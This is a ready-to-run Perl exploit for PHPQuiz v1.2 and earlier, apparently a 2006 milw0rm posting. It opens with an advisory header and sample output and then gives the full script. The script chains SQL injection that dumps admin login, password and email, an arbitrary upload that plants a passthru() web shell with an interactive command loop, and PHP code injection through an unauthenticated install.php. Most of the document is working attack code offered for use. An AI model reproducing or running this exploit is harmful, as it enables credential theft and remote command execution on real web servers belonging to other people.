######################################################
# 
# Title: PHPQuiz <= v.1.2 Remote SQL injection/Code Execution Exploit
# Vendor  : PHPQuiz
# webiste : http://www.phpquiz.com
# Version : <= v.1.2
# Severity: Critical 
# Author: Simo64 / simo64_at_morx_org
# MorX Security Reseach Team
# http://www.morx.org
# http://www.morx.org/phpquiz.txt
#
#   Details : 
#
# SQL injection in score.php
#***************************
#
#   univers var in score.php and quiz_id var in home.php are not proprely verified and can be used to inject query
#
#   PoC : http://localhost/phpquiz/front/?what=score&univers=[SQL]
#		  http://localhost/phpquiz/front/?quiz=quiz&univers=1&step=1&quiz_id=[SQL]
#
# Arbitary File Upload
#********************** 
# vulnerable code in back/upload_img.php and admin/upload_img.php near lines 74-76
# 
#  74  if (($upload) && ($ok_update == "yes")) {
#  75
#  76  if(@copy($image, $path)){
#  77  .....
#
# $upload , $ok_update , $image , $path variables are not sanitized and can be used to upload files
# 
#  PoC Exploit : 
#
#  <form enctype="multipart/form-data" method="post" action="http://localhost/phpquiz/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/l3ez.php">
#  Download File<br>
#  <input name="image" type="file" size="20"><br>
#  <input type="submit" name="upload" value="Upload"><form>
#
#  phpquiz/img_quiz/ folder is by defaut writable so after uploading a simple phpshell <?passthru($cmd);?>
#
#  we can lanche cmd from : http://localhost/phpquiz/img_quiz/l3ez.php?cmd=ls
#
# PHP Code Injection
#********************
#
# cfgphpquiz/install.php is accessible without authentification , the script is used to 
# save configuration setting in config.inc.php.
#
# Impact:
# any remote user can post php code to the vulnerable file, view current configuration which contains sensitive information # such as admin password (plain text) and login
#
#***********************************************************************************
#
# simo64@localhost:~$ phpquiz.pl morx.org /phpquiz/ 1
# 
# /-----------------------------------------------------------\
# | PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
# |            Coded by simo64 - simo64_morx.org              |
# |                      www.morx.org                         |
# |-----------------------------------------------------------|
# |       MorX Security Research Team ©                       |
# \-----------------------------------------------------------/
# 
# Connecting to www.morx.org ...      Connected !
# 
# [+] Injecting credentials
# 
# Sending Data ...
# 
# SQL injection Succeded !
# 
#         User EMail  : admin@morx.org
#         User Login  : admin
#         User Passwd : password
# 
# [+] Exec CMD by uploading a shell       Connected !
# 
# Uploading shell ...     [OK]
# 
# Checking if successfully Uploaded ....  [OK]
# 
#                 NOW YOU CAN LAUNCH COMMANDS
# 
# simo64[at]morx.org :~$ id
# uid=48(apache) gid=48(apache) groups=48(apache),2522(psaserv)
# simo64[at]morx.org :~$ pwd
# /home/morx/public_html/phpquiz/img_quiz
# simo64[at]morx.org :~$ ls
# id_1.gif
# id_2.gif
# id_3.gif
# id_4.gif
# index.php
# zaz.php
# simo64[at]morx.org :~$ exit
# 
#!/usr/bin/perl

use IO::Socket ;
use LWP::Simple ;

print q(

/-----------------------------------------------------------\
| PHPQuiz v.1.2 Remote SQL injection/Code Execution Exploit |
|            Coded by simo64 - simo64_morx.org              |
|                      www.morx.org                         |
|-----------------------------------------------------------|
|                MorX Security Research Team ©              |
\-----------------------------------------------------------/

);

sub usage(){

print "\nUsage   :perl $0 siteurl /path/ userid\n";
print "\nExemple : perl $0 phpquiz.com /phpquiz/ 1\n";

}

if(!@ARGV){
	&usage();
	exit(0)
}

$host = $ARGV[0];
$path = $ARGV[1];
$uid  = $ARGV[2];
$success = null ;
$injected = 0;
$injcheck = $path."cfgphpquiz/config.inc.php?xD=l3fou";
$phpinject = $path."cfgphpquiz/install.php?submit=Valider&config_alert_email_name=%22;echo%20\@\$xD;\@system(\$morx);//MorX%20RulZ%20=)";
$injectuser = "front/?what=score&univers=-64%20UNION%20SELECT%20null,LOGIN,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
$injectpass = "front/?what=score&univers=-64%20UNION%20SELECT%20null,PWD,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";
$injectmail = "front/?what=score&univers=-64%20UNION%20SELECT%20null,EMAIL,null,null,null,null,null,null,null,null%20FROM%20user%20WHERE%20ID=$uid/*";

syswrite STDOUT , "Connecting to $host ...";

my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
                                
   die "\n\nUnable to connect to $host " unless($sock) ;

syswrite STDOUT , "\tConnected !\n\n\[+] Injecting credentials\n\nSending Data ...";


	print $sock "GET $path$injectmail HTTP/1.1\n";
	print $sock "Host: $host\n";
	print $sock "Connection: Close\n\n";

	while($res = <$sock>){
		if($res =~ /anim_fleche_droite.gif" border="0">&nbsp;&quot;(.*?)&quot;<\/a>/){
			$usermail = $1 ;
			$success = "ok" ;
			}
	}
	
if($success eq "ok") { 

syswrite STDOUT , "\n\nSQL injection Succeded !\n\n";
sleep 2 ;
syswrite STDOUT , "\tUser EMail  : $usermail\n";
 
 my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
 
	print $sock "GET $path$injectuser HTTP/1.1\n";
	print $sock "Host: $host\n";
	print $sock "Connection: Close\n\n";

	while($res = <$sock>){
		if($res =~ />&nbsp;&quot;(.*?)&quot;/){
			$userlogin = $1 ;
			}
	}
	syswrite STDOUT , "\tUser Login  : $userlogin\n";
	
my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);

	print $sock "GET $path$injectpass HTTP/1.1\n";
	print $sock "Host: $host\n";
	print $sock "Connection: Close\n\n";

	while($res = <$sock>){
		if($res =~ />&nbsp;&quot;(.*?)&quot;/){
			$userpass = $1 ;
			}
	}

syswrite STDOUT , "\tUser Passwd : $userpass\n\n";


} else {print "\n\nInjecting credentials Exploit Failed !\n\n";}

sleep 2;

# PART2 Remote Command Execution by uploaing shell

syswrite STDOUT , "\n[+] Exec CMD by uploading a shell";

my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);
                                
   die "\n\nUnable to connect to $host " unless($sock) ;

syswrite STDOUT , "\tConnected !\n\n";
syswrite STDOUT , "Uploading shell ...";

$data='-----------------------------7d61592213049c
Content-Disposition: form-data; name="dir"

/
-----------------------------7d61592213049c
Content-Disposition: form-data; name="image"; filename="zaz.php"
Content-Type: text/plain

<?php
if (get_magic_quotes_gpc()){$_GET[\'cmd\']=stripslashes($_GET[\'cmd\']);}
passthru($_GET[\'cmd\']);
?>
-----------------------------7d61592213049c
Content-Disposition: form-data; name="submit"

Upload
-----------------------------7d61592213049c--
';

$script = $path."/back/upload_img.php?upload=1&ok_update=yes&path=./../img_quiz/zaz.php";

$len = length $data ;

  print $sock "POST $script HTTP/1.0\r\n";
  print $sock "Content-Type: multipart/form-data; boundary=---------------------------7d61592213049c\r\n";
  print $sock "Host: $host\r\n";
  print $sock "Content-Length: $len\r\n";
  print $sock "Connection: close\r\n\r\n";
  print $sock $data;
  
 syswrite STDOUT , "\t[OK]\n\nChecking if successfully Uploaded .... ";
 
my $sock = new IO::Socket::INET ( PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);

 print $sock "HEAD $path"."img_quiz/zaz.php  HTTP/1.0\r\n";
 print $sock "Host: $host\r\n";
 print $sock "Connection: close\n\n";
 
 while($rep = <$sock>){
 if($rep =~ /HTTP\/1.1 200 OK/) { $success = 1; }
 }
if($success == 1){

	print "\t[OK]\n\n\t\tNOW YOU CAN LAUNCH COMMANDS\n\n";
	
	while(){
	print "simo64[at]morx.org :~\$ ";
	chop($cmd=<STDIN>);
	exit() if ($cmd eq 'exit');
	$result = get("http://$host".$path."img_quiz/zaz.php?cmd=$cmd");
	print $result;
	}

}
else { print "\tFailed !\n\nFile Upload Failed\n\n" }

# STEP 3 Injecting PHPcode into config.inc.php file

print "\n[+] Injecting PHP Code......\n\nConnecting ....";

my $sock = new IO::Socket::INET (PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);

die "Connot Connect to $host !" unless($sock);

print "\tConnected !\n\nSending Data ....\t";


	print $sock "GET $phpinject HTTP/1.1\n";
	print $sock "Host: $host\n";
	print $sock "Content-Type: application/x-www-form-urlencoded\n";
	print $sock "User-Agent: MorX-Zilla\n";
	print $sock "Connection: Close\n\n";
	
print "\t OK\n\nChecking if code injected ...";

my $sock = new IO::Socket::INET (PeerAddr => "$host",PeerPort => "80",Proto => "tcp",);

	print $sock "GET $injcheck HTTP/1.1\n";
	print $sock "Host: $host\n";
	print $sock "Content-Type: application/x-www-form-urlencoded\n";
	print $sock "User-Agent: MorX-Zilla\n";
	print $sock "Connection: Close\n\n";
	
while($check = <$sock>){
if($check =~ /l3fou/) { $injected = 1; }
}
if($injected == 1 ){
print "\tSucceded !\n\n\tNOW YOU ARE IN !\n\n";

while(){
	print "simo\@morx.org :~\$ ";
	$cmd = <STDIN>;
	chop($cmd);
	exit(0) if($cmd eq "exit");
	$result = get("http://".$host.$path."cfgphpquiz/config.inc.php?morx=$cmd");
	print $result;
	}
}
else {print "\tFailed\n\nPHPCode Injection Failed !\n\n";}

# milw0rm.com [2006-09-16]
